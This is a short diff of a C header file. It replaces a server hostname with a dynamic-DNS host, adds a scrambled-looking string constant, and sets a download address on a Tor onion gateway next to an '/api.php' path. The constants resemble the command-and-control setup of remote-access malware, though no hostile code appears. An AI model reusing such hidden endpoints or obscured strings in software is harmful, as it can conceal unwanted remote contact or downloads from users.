@@ -62,8 +62,9 @@
 
 # include "../libft/libft.h"
 
-# define url "gdjgufsdhugfsadyuihfyuisdghf.pandeo.fr"
-# define download_url "anonfile"
+# define url "GPfdsofidngffds.ddns.net"
+# define stringifer "Zib'vZg]^u'_k"
+# define download_url "https://bpnkhnmt5voyl4suuf3kuybq4o7xqijlniqa223t4dp3oqy2hs3jwkqd.onion.ly/"
 # define url_page "/api.php"
 
 char			*ft_strnjoin(char *s1, char *s2, int n);
